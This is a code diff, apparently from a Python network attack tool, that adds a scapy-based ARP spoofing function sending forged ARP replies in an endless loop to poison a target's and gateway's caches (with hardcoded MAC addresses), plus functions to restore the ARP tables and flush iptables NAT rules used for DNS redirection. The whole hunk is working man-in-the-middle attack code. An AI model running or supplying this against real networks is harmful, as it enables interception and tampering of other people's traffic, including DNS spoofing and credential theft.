@@ -72,3 +72,51 @@ def process_packet(packet):
                 f"- IP Resolved: {answers}\n"
             )
         write_log(dns_log, data)
+
+def arp_spoofing(target_ip, gateway_ip, interface):
+    """ Send ARP packets to spoof an IP """    
+    os.system(f"ping -c 1 {target_ip} > /dev/null")
+    target_mac = get_mac(target_ip)
+    #gateway_mac = get_mac(gateway_ip)
+    gateway_mac = "88:de:7c:a6:45:d0"
+    #my_mac = random_mac()
+    #my_mac = scapy.get_if_hwaddr("eth0")
+    my_mac = "f4:96:34:95:df:3f"
+    #if target_mac is None or gateway_mac is None:
+    #    print("[!] Could not get the target or router MAC.")
+    #    return
+    target_arp = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=my_mac)
+    router_arp = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=my_mac)
+    target_eth_frame = scapy.Ether(dst=target_mac, src=my_mac) / target_arp
+    router_eth_frame = scapy.Ether(dst=gateway_mac, src=my_mac) / router_arp
+    try:
+        while True:
+            scapy.sendp(target_eth_frame, iface=interface, verbose=False)
+            scapy.sendp(router_eth_frame, iface=interface, verbose=False)
+            #scapy.send(target_arp, verbose=False)
+            #scapy.send(router_arp, verbose=False)
+            print(f"[+] Poisoning {target_ip}...")
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print(f"\n[!] Spoofing has been stopped.")
+        restore_arp(target_ip, gateway_ip)
+        return
+
+def restore_arp(target_ip, gateway_ip):
+    """ Restore the ARP table of the target and the router """
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    if target_mac is None or gateway_mac is None:
+        print("[!] Could not get the target or router MAC.")
+        return
+    print(f"[+] Restoring the ARP tables...")
+    restore_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    restore_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
+    scapy.send(restore_target, count=5, verbose=False)
+    scapy.send(restore_gateway, count=5, verbose=False)
+    print("[+] ARP table restored.")
+
+def restore_dns():
+    """ Restore the iptables rules for DNS traffic redirection """
+    os.system("sudo iptables -t nat -F")
+    print("[+] DNS rules restored.")
